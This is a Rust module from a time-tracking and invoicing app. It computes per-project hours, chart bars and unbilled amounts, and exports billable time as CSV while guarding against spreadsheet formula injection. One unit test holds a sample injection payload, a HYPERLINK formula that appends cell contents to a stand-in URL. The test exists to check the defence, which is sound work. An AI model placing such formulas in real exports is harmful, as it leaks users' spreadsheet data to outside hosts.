// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright © 2026 Aurélien Pierre

//! Time spent, as the Time page and a project's page show it: a bar per day
//! (per month over a year), the hours of each project, and for work done for
//! someone, what is left to bill. A session counts for its own project when
//! it names one, else for its task's project, else its task's first case.

use crate::cases::Case;
use crate::i18n::Translator;
use crate::money::Money;
use crate::tasks::Task;
use crate::timelog::Session;
use jiff::Span;
use jiff::civil::Date;
use jiff::tz::TimeZone;
use serde::Serialize;

/// One stretch of time, its project and task found.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct Entry {
    pub key: String,
    pub start: i64,
    pub day: Date,
    pub minutes: u32,
    /// The case's id; "" when it counts for none.
    pub project: String,
    pub task: String,
    /// The task's title, else the note, else the project's title.
    pub title: String,
    pub note: String,
    /// Work for someone, not marked as given.
    pub billable: bool,
    pub invoice: String,
}

/// Each session with its project and title.
pub fn entries(sessions: &[Session], tasks: &[Task], cases: &[Case], zone: &TimeZone) -> Vec<Entry> {
    sessions
        .iter()
        .map(|s| {
            let task = tasks.iter().find(|t| !s.task.is_empty() && t.uid == s.task);
            // The task's project first, else its first case.
            let from_task = task.and_then(|t| t.cases.iter().find(|c| cases.iter().any(|x| x.id == **c && x.is_project())).or(t.cases.first())).cloned();
            let project = if s.project.is_empty() { from_task.unwrap_or_default() } else { s.project.clone() };
            let case = cases.iter().find(|c| c.id == project);
            let title = match task {
                Some(t) => t.title.clone(),
                None if !s.note.is_empty() => s.note.clone(),
                None => case.map(|c| c.title.clone()).unwrap_or_default(),
            };
            Entry {
                key: s.key(),
                start: s.start,
                day: jiff::Timestamp::from_second(s.start).map(|t| t.to_zoned(zone.clone()).date()).unwrap_or(Date::ZERO),
                minutes: s.minutes,
                // The task's own word first, else its project's: work for a client is billed.
                billable: task.and_then(|t| t.billable).unwrap_or_else(|| case.is_some_and(Case::is_project)) && !s.unbilled,
                project,
                task: s.task.clone(),
                title,
                note: s.note.clone(),
                invoice: s.invoice.clone(),
            }
        })
        .collect()
}

/// What `minutes` at `rate` an hour come to, to the cent.
pub fn amount(minutes: u32, rate: f64) -> Money {
    Money((f64::from(minutes) * rate * 100.0 / 60.0).round() as i64)
}

/// "45 min", "2 h", "2 h 30".
pub fn duration(minutes: u32) -> String {
    match (minutes / 60, minutes % 60) {
        (0, m) => format!("{m} min"),
        (h, 0) => format!("{h} h"),
        (h, m) => format!("{h} h {m:02}"),
    }
}

/// One project's time.
#[derive(Debug, Clone, Serialize)]
pub struct ProjectTime {
    pub id: String,
    pub title: String,
    /// Its place among the colours of the bars.
    pub index: usize,
    pub minutes: u32,
    pub time: String,
    pub billable: bool,
    /// Billable time not on an invoice yet, whenever it was spent.
    pub unbilled_minutes: u32,
    pub unbilled: String,
    pub unbilled_amount: String,
    pub rate: f64,
}

/// One bar: a day, or a month over a year.
#[derive(Debug, Clone, Serialize)]
pub struct Bar {
    pub label: String,
    pub date: String,
    pub minutes: u32,
    /// Minutes by project, in the order of `projects`.
    pub parts: Vec<u32>,
    pub today: bool,
}

/// One stretch of time, as listed.
#[derive(Debug, Clone, Serialize)]
pub struct EntryView {
    pub key: String,
    pub date: String,
    pub time: String,
    pub title: String,
    pub project: String,
    pub project_title: String,
    pub note: String,
    pub billable: bool,
    pub invoice: String,
    /// Noted by hand: it can be taken out. Every stretch not billed can be changed.
    pub by_hand: bool,
    /// As the form takes it: "2026-10-03", from "14:30" to "15:15", minutes.
    pub day: String,
    pub at: String,
    pub until: String,
    pub minutes: u32,
    /// The task it was given to (its UID); "" for a project alone.
    pub task: String,
    /// How its minutes were known: "measured", "typed", "corrected", "unknown"
    /// (`timelog::Kind`), and that in a word, said quietly; set by the caller.
    pub kind: String,
    pub kind_said: String,
}

/// The Time page, for a week, a month or a year.
#[derive(Debug, Clone, Serialize)]
pub struct TimeView {
    /// "Week of 28 September", "October 2026", "2026".
    pub title: String,
    pub period: String,
    /// The first day shown, to move from.
    pub from: String,
    pub total: String,
    pub projects: Vec<ProjectTime>,
    pub bars: Vec<Bar>,
    pub most: u32,
    pub entries: Vec<EntryView>,
    /// "Nothing noted this week.", when so.
    pub sentence: String,
}

/// A project's billable time from `from` to `to` (both included), as a
/// spreadsheet reads it: what was done, how many hours, at what rate, for how
/// much, one line per task (or note), then the total. Nothing else: a full
/// invoice is the invoice's (invoice.rs). In French, `;` between fields and a
/// decimal comma, as French spreadsheets expect; else `,` and a point.
pub fn billable_csv(all: &[Entry], case: &Case, from: Date, to: Date, default_rate: f64, french: bool, words: [&str; 5]) -> String {
    let (sep, decimal) = if french { (';', ',') } else { (',', '.') };
    let number = |value: f64| format!("{value:.2}").replace('.', &decimal.to_string());
    // A title is text, never a formula: one starting with "=", "+", "-", "@" (a task made from
    // someone's mail, `=HYPERLINK(…)`) would run in the spreadsheet; a quote before it keeps it text.
    let field = |text: &str| {
        let text = if text.starts_with(['=', '+', '-', '@', '\t', '\r']) { format!("'{text}") } else { text.to_string() };
        if text.contains([sep, '"', '\n', '\r']) { format!("\"{}\"", text.replace('"', "\"\"")) } else { text }
    };
    let rate = case.rate.unwrap_or(default_rate);
    let mut by_what: Vec<(String, u32)> = Vec::new();
    for e in all.iter().filter(|e| e.project == case.id && e.billable && e.day >= from && e.day <= to) {
        let what = if e.title.trim().is_empty() { case.title.clone() } else { e.title.trim().to_string() };
        match by_what.iter_mut().find(|(w, _)| *w == what) {
            Some((_, minutes)) => *minutes += e.minutes,
            None => by_what.push((what, e.minutes)),
        }
    }
    let [what, hours, per_hour, amount_word, total] = words;
    let mut out = [what, hours, per_hour, amount_word].map(field).join(&sep.to_string()) + "\r\n";
    let mut minutes_total = 0;
    for (what, minutes) in &by_what {
        minutes_total += minutes;
        let money = amount(*minutes, rate);
        out.push_str(&[field(what), number(f64::from(*minutes) / 60.0), number(rate), number(money.cents() as f64 / 100.0)].join(&sep.to_string()));
        out.push_str("\r\n");
    }
    let money = amount(minutes_total, rate);
    out.push_str(&[field(total), number(f64::from(minutes_total) / 60.0), String::new(), number(money.cents() as f64 / 100.0)].join(&sep.to_string()));
    out.push_str("\r\n");
    out
}

/// The first and last day of `period` ("week", "month", "year") around `anchor`.
pub fn bounds(period: &str, anchor: Date) -> (Date, Date) {
    match period {
        "year" => (anchor.first_of_year(), anchor.last_of_year()),
        "month" => (anchor.first_of_month(), anchor.last_of_month()),
        _ => {
            let monday = anchor.checked_sub(Span::new().days(i64::from(anchor.weekday().to_monday_zero_offset()))).unwrap_or(anchor);
            (monday, monday.checked_add(Span::new().days(6)).unwrap_or(monday))
        }
    }
}

/// What the Time page shows for `period` around `anchor`, every project or one.
pub fn view(all: &[Entry], cases: &[Case], sessions_by_hand: &dyn Fn(&str) -> bool, period: &str, anchor: Date, project: Option<&str>, default_rate: f64, today: Date, tr: &Translator) -> TimeView {
    let (from, to) = bounds(period, anchor);
    let wanted = |e: &&Entry| project.is_none_or(|p| e.project == p);
    let shown: Vec<&Entry> = all.iter().filter(wanted).filter(|e| e.day >= from && e.day <= to).collect();
    // Projects with time in the period, the most first; then those with time left to bill.
    let mut ids: Vec<String> = Vec::new();
    for e in &shown {
        if !ids.contains(&e.project) {
            ids.push(e.project.clone());
        }
    }
    let minutes_of = |id: &str| shown.iter().filter(|e| e.project == id).map(|e| e.minutes).sum::<u32>();
    ids.sort_by_key(|id| std::cmp::Reverse(minutes_of(id)));
    for e in all.iter().filter(wanted).filter(|e| e.billable && e.invoice.is_empty()) {
        if !ids.contains(&e.project) {
            ids.push(e.project.clone());
        }
    }
    let projects: Vec<ProjectTime> = ids
        .iter()
        .enumerate()
        .map(|(index, id)| {
            let case = cases.iter().find(|c| c.id == *id);
            let rate = case.and_then(|c| c.rate).unwrap_or(default_rate);
            let unbilled_minutes: u32 = all.iter().filter(|e| e.project == *id && e.billable && e.invoice.is_empty()).map(|e| e.minutes).sum();
            let minutes = minutes_of(id);
            ProjectTime {
                id: id.clone(),
                title: case.map_or_else(|| tr.text(if id.is_empty() { "time-no-project" } else { "time-gone-project" }, None), |c| c.title.clone()),
                index,
                minutes,
                time: duration(minutes),
                billable: case.is_some_and(Case::is_project),
                unbilled_minutes,
                unbilled: if unbilled_minutes > 0 { duration(unbilled_minutes) } else { String::new() },
                unbilled_amount: if unbilled_minutes > 0 && rate > 0.0 { tr.money(amount(unbilled_minutes, rate)) } else { String::new() },
                rate,
            }
        })
        .collect();
    let part_of = |entries: &[&&Entry]| -> Vec<u32> { ids.iter().map(|id| entries.iter().filter(|e| e.project == *id).map(|e| e.minutes).sum()).collect() };
    let bars: Vec<Bar> = if period == "year" {
        (1..=12)
            .filter_map(|m| Date::new(from.year(), m, 1).ok())
            .map(|first| {
                let here: Vec<&&Entry> = shown.iter().filter(|e| e.day.year() == first.year() && e.day.month() == first.month()).collect();
                Bar {
                    // The language's own short names: three letters gave French June and July both "jui".
                    label: tr.month_short(first),
                    date: first.to_string(),
                    minutes: here.iter().map(|e| e.minutes).sum(),
                    parts: part_of(&here),
                    today: today.year() == first.year() && today.month() == first.month(),
                }
            })
            .collect()
    } else {
        let mut days = Vec::new();
        let mut day = from;
        while day <= to {
            let here: Vec<&&Entry> = shown.iter().filter(|e| e.day == day).collect();
            days.push(Bar {
                label: if period == "week" { tr.weekday_short(day) } else { day.day().to_string() },
                date: day.to_string(),
                minutes: here.iter().map(|e| e.minutes).sum(),
                parts: part_of(&here),
                today: day == today,
            });
            day = match day.tomorrow() {
                Ok(next) => next,
                Err(_) => break,
            };
        }
        days
    };
    let total: u32 = shown.iter().map(|e| e.minutes).sum();
    let mut listed: Vec<&&Entry> = shown.iter().collect();
    listed.sort_by_key(|e| std::cmp::Reverse(e.start));
    let title = match period {
        "year" => from.year().to_string(),
        "month" => tr.month_year(from),
        _ => {
            let mut args = crate::i18n::args();
            args.set("day", tr.day_month(from));
            tr.text("time-week-of", Some(&args))
        }
    };
    TimeView {
        title,
        period: period.to_string(),
        from: from.to_string(),
        total: duration(total),
        most: bars.iter().map(|b| b.minutes).max().unwrap_or(0),
        bars,
        entries: listed
            .into_iter()
            .map(|e| EntryView {
                key: e.key.clone(),
                date: tr.day(e.day),
                time: duration(e.minutes),
                title: e.title.clone(),
                project: e.project.clone(),
                project_title: projects.iter().find(|p| p.id == e.project).map(|p| p.title.clone()).unwrap_or_default(),
                note: if e.note == e.title { String::new() } else { e.note.clone() },
                billable: e.billable,
                invoice: e.invoice.clone(),
                by_hand: sessions_by_hand(&e.key),
                day: e.day.to_string(),
                at: jiff::Timestamp::from_second(e.start).map(|t| t.to_zoned(jiff::tz::TimeZone::system()).strftime("%H:%M").to_string()).unwrap_or_default(),
                until: jiff::Timestamp::from_second(e.start + i64::from(e.minutes) * 60).map(|t| t.to_zoned(jiff::tz::TimeZone::system()).strftime("%H:%M").to_string()).unwrap_or_default(),
                minutes: e.minutes,
                task: e.task.clone(),
                kind: String::new(),
                kind_said: String::new(),
            })
            .collect(),
        sentence: if total == 0 { tr.text(&format!("time-nothing-{period}"), None) } else { String::new() },
        projects,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn billable_time_as_a_spreadsheet() {
        let day = |d: &str| d.parse::<Date>().unwrap();
        let entry = |title: &str, d: &str, minutes: u32, billable: bool| Entry { key: String::new(), start: 0, day: day(d), minutes, project: "studio".into(), task: String::new(), title: title.into(), note: String::new(), billable, invoice: String::new() };
        let all = vec![entry("Logo; second draft", "2026-10-01", 90, true), entry("Logo; second draft", "2026-10-02", 30, true), entry("Call", "2026-10-02", 60, false), entry("Site", "2026-11-01", 60, true)];
        let case = Case { id: "studio".into(), title: "Studio".into(), rate: Some(60.0), ..Case::default() };
        let csv = billable_csv(&all, &case, day("2026-10-01"), day("2026-10-31"), 50.0, true, ["Quoi", "Heures", "Taux horaire", "Montant", "Total"]);
        assert_eq!(csv, "Quoi;Heures;Taux horaire;Montant\r\n\"Logo; second draft\";2,00;60,00;120,00\r\nTotal;2,00;;120,00\r\n");
        let english = billable_csv(&all, &case, day("2026-01-01"), day("2026-12-31"), 50.0, false, ["What", "Hours", "Hourly rate", "Amount", "Total"]);
        assert!(english.ends_with("Total,3.00,,180.00\r\n"), "{english}");
        // A title that a spreadsheet would run as a formula stays text.
        let formula = vec![entry("=HYPERLINK(\"https://example.org/?\"&A1)", "2026-10-01", 60, true)];
        let csv = billable_csv(&formula, &case, day("2026-10-01"), day("2026-10-31"), 50.0, false, ["What", "Hours", "Hourly rate", "Amount", "Total"]);
        assert!(csv.contains("\r\n\"'=HYPERLINK(\"\"https://example.org/?\"\"&A1)\",1.00,60.00,60.00\r\n"), "{csv}");
    }

    fn case(id: &str, project: bool, rate: Option<f64>) -> Case {
        Case { id: id.into(), title: id.to_uppercase(), kind: project.then(|| "project".to_string()), rate, ..Case::default() }
    }

    #[test]
    fn time_by_project_and_left_to_bill() {
        let zone = TimeZone::UTC;
        let day = |d: &str, h: i8| Date::from(d.parse::<Date>().unwrap()).at(h, 0, 0, 0).to_zoned(zone.clone()).unwrap().timestamp().as_second();
        let site = Task { uid: "t".into(), title: "Build the site".into(), cases: vec!["housing".into(), "lumen".into()], ..Task::default() };
        let sessions = vec![
            Session { task: "t".into(), start: day("2026-10-05", 9), minutes: 90, ..Session::default() },
            Session { project: "lumen".into(), start: day("2026-10-06", 14), minutes: 30, note: "Call with the client".into(), ..Session::default() },
            Session { project: "lumen".into(), start: day("2026-10-06", 16), minutes: 60, invoice: "2026-001".into(), ..Session::default() },
            Session { project: "housing".into(), start: day("2026-10-07", 10), minutes: 45, ..Session::default() },
            Session { project: "lumen".into(), start: day("2026-09-20", 10), minutes: 15, unbilled: true, ..Session::default() },
        ];
        let cases = vec![case("housing", false, None), case("lumen", true, Some(60.0))];
        let all = entries(&sessions, &[site], &cases, &zone);
        // The task counts for its project, not its first case.
        assert_eq!(all[0].project, "lumen");
        assert!(all[0].billable && !all[3].billable && !all[4].billable);
        let tr = Translator::new("en");
        let today: Date = "2026-10-07".parse().unwrap();
        let week = view(&all, &cases, &|_| false, "week", today, None, 40.0, today, &tr);
        assert_eq!(week.total, "3 h 45");
        assert_eq!(week.bars.len(), 7);
        assert_eq!((week.bars[0].minutes, week.bars[1].minutes, week.bars[2].minutes), (90, 90, 45));
        let lumen = &week.projects[0];
        assert_eq!((lumen.id.as_str(), lumen.minutes, lumen.unbilled_minutes), ("lumen", 180, 120));
        assert_eq!(lumen.unbilled_amount, tr.money(Money(12000)));
        assert_eq!(week.entries[0].title, "HOUSING", "newest first, titled by its project");
        let year = view(&all, &cases, &|_| false, "year", today, Some("lumen"), 40.0, today, &tr);
        assert_eq!((year.bars.len(), year.bars[8].minutes, year.bars[9].minutes), (12, 15, 180));
        assert_eq!(amount(50, 60.0), Money(5000));
        assert_eq!((duration(45).as_str(), duration(120).as_str(), duration(150).as_str()), ("45 min", "2 h", "2 h 30"));
    }
}
